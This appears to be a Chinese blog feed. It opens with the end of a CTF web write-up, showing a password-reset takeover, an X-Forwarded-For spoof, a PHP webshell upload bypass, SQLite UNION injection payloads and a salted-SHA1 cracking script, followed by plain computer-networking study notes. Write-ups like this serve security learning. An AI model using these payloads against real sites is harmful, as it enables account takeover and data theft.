class="keyword">if</span>(e.match(/e98aa$/)!=<span class="keyword">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(/c7be9/)!=<span class="keyword">null</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line"><span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line"><span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span><br><span class="line">document.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">             document.write(<span class="string">'&lt;input id="c"&gt;&lt;button οnclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line">delete</span><br></pre></td></tr></table></figure><p>将关键代码放到控制台执行即可</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/L5r4PDTK/10.png" class="lazyload"></p><h3 id="0x08-bug"><a href="#0x08-bug" class="headerlink" title="0x08 bug"></a>0x08 bug</h3><p>注册账号后登陆，点击manage时提示不是admin，在首页<strong>Findpwd</strong>页面可以修改密码，使用bp抓包后修改username的值为admin即可成功修改admin的密码</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/C15w6Xrp/11.png" class="lazyload"></p><p>使用admin账号登陆，点击manage提示“IP Not allowed！”，尝试使用bp抓包修改X-Forwarded-For为127.0.0.1，即可查看manage页面</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/zXgGNmzJ/12.png" class="lazyload"></p><p>查看源码存在提示</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></span><br></pre></td></tr></table></figure><p>通过filemanage可以猜测do=upload，尝试访问</p><figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="built_in">index</span>.php?<span class="keyword">module</span>=filemanage&amp;<span class="keyword">do</span>=upload</span><br></pre></td></tr></table></figure><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/fRQTTHyY/13.png" class="lazyload"></p><p>上传php文件，提示“It is a php！”，上传png/jpg文件提示“You know what I want！”，上传png使用bp把内容修改为php代码，提示<img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/K87cKn3w/14.png" class="lazyload"></p><p>再次尝试将文件内容修改为html语言</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="actionscript">system(<span class="string">"ls"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>依然不能上传，查看wp，我们需要把文件后缀改为”<strong>.php5</strong>“(不知道什么原理)，再次上传，即可获得flag</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/q7jkw4LG/15.png" class="lazyload"></p><h3 id="0x09-FlatScience"><a href="#0x09-FlatScience" class="headerlink" title="0x09 FlatScience"></a>0x09 FlatScience</h3><p>尝试robots.txt，发现存在两个页面</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/CxwQmYXd/23.png" class="lazyload"></p><p>admin.php无论如何输入都没有什么反馈</p><p>login.php页面源码存在提示</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/DfbHzx1f/24.png" class="lazyload"></p><p>传参?debug=1，可以得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网站使用的是sqlite数据库，构造usr，pwd随意</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'union <span class="keyword">select</span> <span class="keyword">name</span>, <span class="keyword">name</span> <span class="keyword">from</span> sqlite_master <span class="keyword">where</span> <span class="keyword">type</span>=<span class="string">'table'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/vTW0tSvW/25.png" class="lazyload"></p><p>继续构造usr</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">'union <span class="keyword">SELECT</span> <span class="keyword">sql</span>,<span class="keyword">sql</span> <span class="keyword">FROM</span> sqlite_master <span class="keyword">WHERE</span> tbl_name =<span class="string">'Users'</span> <span class="keyword">and</span> <span class="keyword">type</span> = <span class="string">'table'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/Qd60m7cn/26.png" class="lazyload"></p><p>Set-Cookie中的内容为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE Users(</span><br><span class="line">id int primary key,</span><br><span class="line">name varchar(255),</span><br><span class="line">password varchar(255),</span><br><span class="line">hint varchar(255)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>继续构造usr查询</p><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="string">'union select id, id from Users limit 0,1-- </span></span><br><span class="line"><span class="string">'</span><span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">id</span>, <span class="title">name</span> <span class="title">from</span> <span class="title">Users</span> <span class="title">limit</span> 0,1-- </span></span><br><span class="line"><span class="string">'union select id, password from Users limit 0,1-- </span></span><br><span class="line"><span class="string">'</span><span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">id</span>, <span class="title">hint</span> <span class="title">from</span> <span class="title">Users</span> <span class="title">limit</span> 0,1--</span></span><br></pre></td></tr></table></figure><p>分别得到</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">admin</span><br><span class="line"><span class="number">3</span>fab54a50e770d830c0416df817567662a9dc85c</span><br><span class="line"><span class="keyword">my</span>+fav+<span class="built_in">word</span>+<span class="keyword">in</span>+<span class="keyword">my</span>+fav+paper</span><br></pre></td></tr></table></figure><p>修改limit 1,1和limit 2,1可以查出另两个用户的数据，分别为</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line">fritze</span><br><span class="line"><span class="number">54</span>eae8935c90f467427f05e4ece82cf569f89507</span><br><span class="line">my+love+<span class="keyword">is</span></span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line">hansi</span><br><span class="line"><span class="number">34</span>b0bb7c304949f9ff2fc101eef0f048be10d3bd</span><br><span class="line">the+password+<span class="keyword">is</span>+password</span><br></pre></td></tr></table></figure><p>根据admin的hint内容，猜测admin的密码藏在网站中的pdf里，并且password是在fav+paper中找到一个词+Salz之后sha1得到的值为3fab54a50e770d830c0416df817567662a9dc85c</p><p>爬取站点中所有的pdf文件，总共30个，然后用脚本进行解析处理，并用sha1函数与加密的密码进行碰撞已找出正确的密码，拿大佬的脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">pdf_path = get_pdf()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line"><span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">find_password()</span><br></pre></td></tr></table></figure><p>跑出admin的密码为：ThinJerboa</p><p>在admin.php使用密码登陆，即可得到flag</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/MTfPvGM3/27.png" class="lazyload"></p>]]></content>
      
      
        <tags>
            
            <tag> -ctf -Writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>计算机网络复习</title>
      <link href="/2019/07/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/"/>
      <content type="html"><![CDATA[<h4 id="计算机网络定义："><a href="#计算机网络定义：" class="headerlink" title="计算机网络定义："></a>计算机网络定义：</h4><p>​      计算机网络是指将地理位置不同的具有独立功能的多台计算机及其外部设备，线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统。</p><a id="more"></a><h4 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h4><p><img src="https://s2.ax1x.com/2019/11/09/MmtLJH.png" alt></p><h4 id="计算机网络功能："><a href="#计算机网络功能：" class="headerlink" title="计算机网络功能："></a>计算机网络功能：</h4><p>实现资源共享，实现数据信息的快速传递，提高可靠性，提供负载均衡与分布式处理能力，集中管理以及综合信息服务</p><h4 id="互联网特点：连通性和共享"><a href="#互联网特点：连通性和共享" class="headerlink" title="互联网特点：连通性和共享"></a>互联网特点：连通性和共享</h4><h4 id="互联网的组成："><a href="#互联网的组成：" class="headerlink" title="互联网的组成："></a>互联网的组成：</h4><p>​    边缘部分和核心部分，边缘复杂核心简单，</p><p>​    边缘端系统之间两种通信方式：<strong>客户-服务器（C-S）方式</strong>和<strong>对等方式（p2p方式）</strong></p><p><img src="https://i.postimg.cc/pdwKcQY8/2.png" alt></p><p>  路由器在网络核心部分起特殊作用，实现分组交换   </p><p>  电路交换——整个报文的比特流连续地从源点直达终点，好像在一个管道中传送</p><p>  报文交换——整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个节点</p><p>  分组交换——单个分组（报文的一部分）传送到相邻结点，存储下来后查找转发表，转发到下一个结点</p><p><img src="https://i.postimg.cc/xTfMZ1Hs/3.png" alt></p><h4 id="计算机网络的类别："><a href="#计算机网络的类别：" class="headerlink" title="计算机网络的类别："></a>计算机网络的类别：</h4><p>按照网络的作用范围</p><p>广域网WAN，城域网MAN，局域网LAN，个人区域网PAN</p><h3 id="计算机网络性能指标："><a href="#计算机网络性能指标：" class="headerlink" title="计算机网络性能指标："></a>计算机网络性能指标：</h3><p>速率：数据的传送速率，也称<strong>数据率</strong>或<strong>比特率</strong>，单位是<strong>bit/s</strong>，以十进制位单位，k,M,G，代表十的3，6，9次方，计算机中以K,M,G代表2的10，20，30次方</p><p>带宽：数字信道所能传送的最高数据率，单位bit/s</p><p>吞吐量：单位时间内通过某个网络（或信道，接口）的实际数据量</p><p>时延：数据从网络的一端发送到另一端所需要的时间，包括<strong>发送时延</strong>，<strong>传播时延</strong>，<strong>处理时延</strong>和<strong>排队时延</strong></p><p>时延带宽积：时延带宽积 = 传播时延 x 带宽</p><p>往返时间RTT：数据双向交互一次的时间，发送时间=数据长度/发送速率，有效数据率=数据长度/（发送时间+RTT)        吞吐量=数据长度/（发送时间+RTT）</p><p>信道利用率：某信道有百分之几的时间是在被利用的，发送时间/（发送时间+往返时间），吞吐量/信道带宽</p><h3 id="计算机网络体系结构："><a href="#计算机网络体系结构：" class="headerlink" title="计算机网络体系结构："></a>计算机网络体系结构：</h3><p><img src="https://i.postimg.cc/jj77fw0j/4.png" alt></p><h4 id="网络协议的三要素："><a href="#网络协议的三要素：" class="headerlink" title="网络协议的三要素："></a>网络协议的三要素：</h4><p>语法：数据与控制信息的结构或格式</p><p>语义：需要发出何种控制信息，完成何种动作以及做出何种响应</p><p>同步：事件实现顺序的详细说明</p><p><img src="https://i.postimg.cc/c4FwGGBd/5.png" alt></p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h4 id="物理层的作用："><a href="#物理层的作用：" class="headerlink" title="物理层的作用："></a>物理层的作用：</h4><p>​     尽可能屏蔽掉传输媒体和通信手段的差异，使物理层上面的数据链路层感觉不到这些差异，这样就可以使数据链路层只需要考虑如何完成本层的协议与服务，而不必考虑网络的具体传输媒体和通信手段。</p><h4 id="物理层的主要任务描述为确定与传输媒体的接口有关的一些特性："><a href="#物理层的主要任务描述为确定与传输媒体的接口有关的一些特性：" class="headerlink" title="物理层的主要任务描述为确定与传输媒体的接口有关的一些特性："></a>物理层的主要任务描述为确定与传输媒体的接口有关的一些特性：</h4><p>​     机械特性   电气特性    功能特性   过程特性</p><p>​     数据在通信线路上一般是<strong>串行传输</strong>，物理层完成传输方式的转换</p><h4 id="码元：代表不同离散数值的基本波形"><a href="#码元：代表不同离散数值的基本波形" class="headerlink" title="码元：代表不同离散数值的基本波形"></a>码元：代表不同离散数值的基本波形</h4><h4 id="常用编码方式："><a href="#常用编码方式：" class="headerlink" title="常用编码方式："></a>常用编码方式：</h4><p>​    不归零制：正电平1，负电平0   </p><p>​    归零制：正脉冲1，负脉冲0</p><p>​    曼彻斯特编码：中心向上跳变1，向下跳变0，可反过来定义</p><p>​    差分曼彻斯特编码：中心始终跳变，边界有跳变0，无跳变1</p><h4 id="基本的带通调制方法："><a href="#基本的带通调制方法：" class="headerlink" title="基本的带通调制方法："></a>基本的带通调制方法：</h4><p>​     调幅（AM)：载波的振幅随基带数字信号而变化</p><p>​     调频（FM)：载波的频率随基带数字信号而变化</p><p>​     调相（PM)：载波的初始相位随基带数字信号而变化</p><h3 id="正交振幅调制QAM"><a href="#正交振幅调制QAM" class="headerlink" title="正交振幅调制QAM"></a>正交振幅调制QAM</h3><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/wjPN35rP/7.png" class="lazyload"></p><h3 id="信道的极限容量："><a href="#信道的极限容量：" class="headerlink" title="信道的极限容量："></a>信道的极限容量：</h3><p>信道容量是信道能<strong>无错误传送的最大信息量</strong></p><p>数据传输速率：比特速率S，单位时间内传送的二进制位数，单位位每秒，bit/s</p><p>信号传输速率：码元速率B，单位时间内传送的码元个数，单位波特，Baud</p><p>码元离散值个数为N，则携带的比特数n=log2(N)，如码元离散值有4个，则一个码元携带2bit信息，比特速率就为码元速率的2倍，S = B x log2(N)</p><p>奈氏准则：任何信道中码元传输的速率是有上限的，传输速率超过上限就会产生码间串扰，使接收端无法识别码元                 码元传输速率上限值：C = 2 x W x log2(N) Baud/s</p><p>信噪比：信号的平均功率和噪声的平均功率之比，S/N，</p><p>若用dB分贝表示，则S/N(dB) = 10 log10(S/N)</p><p><strong>香农公式：</strong>信道的极限传输速率 C = W x log 2 (1+S/N)  bit/s</p><p>​        W为信道带宽，单位Hz</p><p>​        S为信道内所传信号的平均功率</p><p>​        N为信道内部的高斯噪声功率</p><p>​    提高传输速率：提高信道带宽W，提高信噪比S/N，用编码的方式让每一个码元携带更多bit的信息量</p><h4 id="传输媒体："><a href="#传输媒体：" class="headerlink" title="传输媒体："></a>传输媒体：</h4><p>导引型：</p><ul><li><p>双绞线：屏蔽型（STP）和非屏蔽型（UTP）</p><p>优点：价格便宜，易于布线    </p><p>缺点：耐用性差，易受干扰</p><p>现在常用5类UTP</p></li><li><p>同轴电缆：抗干扰，传输速率较高</p><p>优点：抗干扰能力强</p><p>缺点：价格贵，重，无法结构化布线</p></li><li><p>光纤：利用光导纤维传递光脉冲实现通信，多模和单模</p><p>优点：通信容量非常大；传输损耗小，中继距离长（可达几十上百公里）；抗雷电和电磁干扰能力强；无串音干扰，保密性好；体积小，重量轻</p></li></ul><p>非导引型：</p><ul><li><p>短波通信：依靠电离层的反射实现通信</p><p>通信质量较差，传输速率低</p></li><li><p>地面微波接力通信：终端之间建立若干个中继站，把收到的信号放大后发送到下一站</p><p>优点：频率高，信道容量大，传输质量较高；投资少，见效快</p><p>缺点：会受天气影响，隐蔽性和保密性较差</p></li><li><p>卫星通信：使用人造卫星作为中继器的一种微波接力通信，通信距离远，传播时延较大</p><p>优点：频带宽，通信容量大，受干扰小，通信稳定</p><p>缺点：保密性差，造价高         常用于广播电视通信</p></li></ul><h3 id="信道复用："><a href="#信道复用：" class="headerlink" title="信道复用："></a>信道复用：</h3><p>一般情况下，通信信道带宽远远大于用户所需的带宽，使用信道复用技术可以提高信道利用率，共享信道资源，降低网络成本</p><p>频分复用FDM：频分复用的用户在同样的时间占用不同的带宽资源</p><p>时分复用TDM： 时分复用则是将时间划分为一段段等长的时分复用帧 （TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙，也称为同步TDM。每一个用户所占用的时隙是周期性地出现（其周期就 是 TDM  帧的长度）。</p><p>可能会造成线路资源的浪费 </p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/x8RHdwry/8.png" class="lazyload"></p><p>统计时分复用STDM：STDM帧不是固定分配时隙，而是按需动态分配</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/L8hfHQxL/9.png" class="lazyload"></p><p>波分复用WDM：光的频分复用，在同一根光纤中同时让两个或两个以上的光波长信号通过不同光信道各自传输信息。 </p><p><strong>码分复用CDM：码分多址CDMA，每个用户使用不同的码字，用户之间不会产生干扰</strong></p><ul><li><p><strong>每一个比特时间划分为m个短的间隔，称为码片(chip)。每个站被指派一个唯一的 m bit 码片序列</strong></p></li><li><p><strong>发送1则发送码片序列，发送0则发送码片序列的反码，0写为-1，1写为+1</strong></p></li><li><p><strong>每个站分配的码片序列不仅必须各不相同， 并且还必须互相正交</strong></p></li></ul><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><h3 id="三个基本功能："><a href="#三个基本功能：" class="headerlink" title="三个基本功能："></a>三个基本功能：</h3><ul><li><p>封装成帧</p><p>在一段数据的前后分别添加首部和尾部，构成帧，确定帧的起始和结束</p><p>首部和尾部的一个重要功能就是进行帧定界</p></li><li><p>透明传输</p><p>数据中出现控制字符“SOH”，或“EOH“时在前面插入转义字符”ESC“，字符填充</p></li><li><p>差错检测</p><p>使用循环冗余校验 CRC</p><p><strong>发送的数据M=101001，除数P=1101，则在M后增加3个0为M’，M’与P进行模2运算得余数R=001，R作为冗余码拼接到M后面发送出去，也称帧检验序列FCS，接收端接收数据后，除以相同的P，余数为0则无差错</strong></p><p>生成多项式 P(X)=X^3+X^2+1   P=1101</p><p>仅仅使用CRC只能做到对帧的无差错接收，不能避免<strong>帧丢失，帧重复，帧失序</strong>的问题</p></li></ul><h4 id="点对点协议——PPP"><a href="#点对点协议——PPP" class="headerlink" title="点对点协议——PPP"></a>点对点协议——PPP</h4><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/br8kpz5w/10.png" class="lazyload"></p><p>帧格式：7E标志一个帧的开始或结束</p><p>字节填充：信息字段中出现7E时，与20异或转义为5E并在前面填充7D为（7D，5E）</p><p>​                   出现7D时则转义为（7D，5D）</p><p>​                   出现小于20的字符如03，则转义为（7D，23）</p><p>零比特填充：出现连续的5个1，则填入一个0</p><h4 id="CSMA-CD协议-载波监听-多点接入-碰撞检测"><a href="#CSMA-CD协议-载波监听-多点接入-碰撞检测" class="headerlink" title="CSMA/CD协议   载波监听 多点接入/碰撞检测"></a>CSMA/CD协议   载波监听 多点接入/碰撞检测</h4><p>协议的要点：</p><ul><li>多点接入：总线型网络，多个计算机以多点接入的方式连接在一根总线上</li><li>载波监听：<strong>检测信道</strong>，检测总线上是否有其他计算机发送数据</li><li>碰撞检测：计算机<strong>边发送数据边检测信道上的信号电压大小</strong>，出现碰撞立即停止发送</li></ul><p>电磁波在1KM电缆中的传播时延约为5微秒，单程端到端传播时延记为t</p><p>最长为两倍的端到端传播时延（2t）可以知道是否与其他站发送的数据有碰撞</p><p>使用CSMA/CD协议的以太网只能进行<strong>半双工通信</strong></p><p><strong>争用期</strong>：以太网的端到端往返时延2t，经过争用期这段时间没有检测到碰撞，才能肯定这次发送不会发生碰撞</p><p>具体的争用期时间为51.2微秒，10Mbit/s的以太网可发送512bit，64字节</p><p>以太网规定了最短有效帧长为64字节，凡长度小于64字节的帧都是因冲突而异常中止的无效帧 ，收到即丢弃</p><p>确定碰撞后重传的时机：截断二进制指数退避算法</p><ul><li><p>从整数集合[0,1,…,2^k -1)]中随机地取出一个数， 记为 r。重传所需的时延就是 r 倍的基本退避时间</p></li><li><p>k = Min[重传次数, 10] ，16次则丢弃并向高层报告</p></li></ul><p>强化碰撞：发生碰撞时发送32或48bit的人为干扰信号，让所有用户都知道产生了碰撞</p><p>帧间最小间隔：9.6微秒，使刚收到帧的站的接受缓存来得及清理，以接收下一帧</p><h4 id="以太网的信道利用率"><a href="#以太网的信道利用率" class="headerlink" title="以太网的信道利用率"></a>以太网的信道利用率</h4><p>a=t/T：以太网单程端到端时延t与帧的发送时间T之比，a越小，资源浪费的时间越少</p><p>即以太网连线不能太长，帧不能太长</p><p>极限信道利用率S=T/（T+t）=1/（1+a）</p><h4 id="以太网的MAC帧"><a href="#以太网的MAC帧" class="headerlink" title="以太网的MAC帧"></a>以太网的MAC帧</h4><p>硬件地址又称物理地址或MAC地址，MAC地址共48位</p><p>MAC帧的格式：</p><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/Gtq8RvYX/11.png" class="lazyload"></p><p>无效的MAC帧：  无效则丢弃，以太网不负责重传</p><ul><li>帧的长度不是整数个字节</li><li>用收到的帧检验序列FCS查出有差错</li><li>数据字段的长度不在46—1500字节之间，即有效的MAC帧的长度在64—1518字节之间</li></ul><h4 id="在数据链路层扩展以太网"><a href="#在数据链路层扩展以太网" class="headerlink" title="在数据链路层扩展以太网"></a>在数据链路层扩展以太网</h4><p>网桥：根据MAC地址的目的地址进行转发和过滤，收到帧后，查找转发表，确定发往哪个接口或丢弃</p><p>​            时延增加，存储转发，执行CSMA/CD算法</p><p>交换机：多接口的网桥，工作在全双工模式，具有并行性，多对主机同时通信，内部的帧交换表通过自学习算法建立起来的</p><p>​             优点：用户独享带宽，增加了总容量</p><p>​                        从共享总线以太网到交换机以太网，软硬件及适配器不需要改动</p><p>​                        多速率的接口，方便了不同情况的用户</p><p>   自学习算法：</p><ul><li>收到帧后，查找转发表，是否有与源地址相匹配的项目</li></ul><p>​        没有：增加一个新项目，源地址，接口，有效时间</p><p>​        有：对原有项目进行更新</p><ul><li><p>转发帧，查找交换表，是否有与目的地址相匹配的项目</p><p>没有：向所有其他接口转发，进入的接口除外</p><p>有：按交换表给出的接口转发</p><p>与进入的接口相同则丢弃</p></li></ul><h4 id="广播域和广播风暴"><a href="#广播域和广播风暴" class="headerlink" title="广播域和广播风暴"></a>广播域和广播风暴</h4><p>广播域：指的是广播帧所能传递到的范围，亦即能够直接通信的范围</p><p>广播风暴：由于网络拓扑的设计和连接问题，或其他原因导致广播在网段内大量复制，传播数据帧，导致网络性能下降，甚至网络瘫痪</p><h4 id="虚拟局域网VLAN"><a href="#虚拟局域网VLAN" class="headerlink" title="虚拟局域网VLAN"></a>虚拟局域网VLAN</h4><p>VLAN的划分方法：基于端口（最常使用），基于MAC地址，基于IP地址，基于策略</p><p>优点：隔离限制广播域，抑制广播报文</p><p>​            隔离用户，保证网络安全</p><p>​            组网灵活，良好的扩展性</p><p>Trunk端口：可属于多个VLAN</p><p>802.1Q协议：在以太网的帧格式中插入一个 4 字节的标识符，称为 VLAN 标记(tag)，用来指明发送该帧的工 作站属于哪一个虚拟局域网，增加tag后，以太网 MAC 帧的范围是 68~1522字节</p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>网络层向上只提供<strong>简单灵活的，无连接的，尽最大努力交付的数据报</strong>服务</p><p>与网际协议IP配套使用的协议：</p><ul><li>地址解析协议ARP</li><li>网际控制报文协议ICMP</li><li>网际组管理协议IGMP<img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/4dpVDKB0/6.png" class="lazyload"></li></ul><p>有关的设备：</p><ul><li>物理层使用的中间设备：转发器</li><li>数据链路层使用的中间设备：网桥，桥接器</li><li>网络层使用的中间设备：路由器</li><li>网络层以上使用的中间设备：网关</li></ul><h4 id="虚拟互连网络"><a href="#虚拟互连网络" class="headerlink" title="虚拟互连网络"></a>虚拟互连网络</h4><p>逻辑互连网络，利用IP协议使性能各异的网络<strong>在网络层上看起来好像是一个统一的网络</strong></p><p>直接交付：不需要经任何路由器</p><p>间接交付：需要经过路由器转发</p><h3 id="IP数据报的格式"><a href="#IP数据报的格式" class="headerlink" title="IP数据报的格式"></a>IP数据报的格式</h3><p><img src="/images/placeholder.png" alt data-src="https://i.postimg.cc/XJ6ykj4k/12.png" class="lazyload"></p><p>首部的前一部分是固定长度，共 20 字节， 是所有 IP 数据报必须具有的，整个首部长度为32位的整数倍</p><p>首部长度：最大为15个单位，一个为4字节，首部最大为60字节</p><p>总长度：16位，最大为65535字节，首部和数据部分之和</p><p>标志：最低位MF，为1后面还有分片，为0最后一个分片  中间位DF=0才可以分片</p><p>片偏移：片在原分组中的相对位置，以8个字节为偏移单位</p><p>生存时间TTL：数据报在网络中可通过的路由器数的最大值，路由器每次转发TTL减1，TTL为0就丢弃</p><p><strong>首部检验和：</strong>首部划分为16位的序列，检验和字段清0，各序列相加后（最高位有进位则加到最后一位）取反码，写到检验和字段，接收方收到数据后，首部分为16位相加取反码，结果为0则保留</p><h3 id="分类IP地址"><a href="#分类IP地址" class="headerlink" title="分类IP地址"></a>分类IP地址</h3><p>IP 地址 ::= { &lt;网络号&gt;, &lt;主机号&gt;}       ”::= 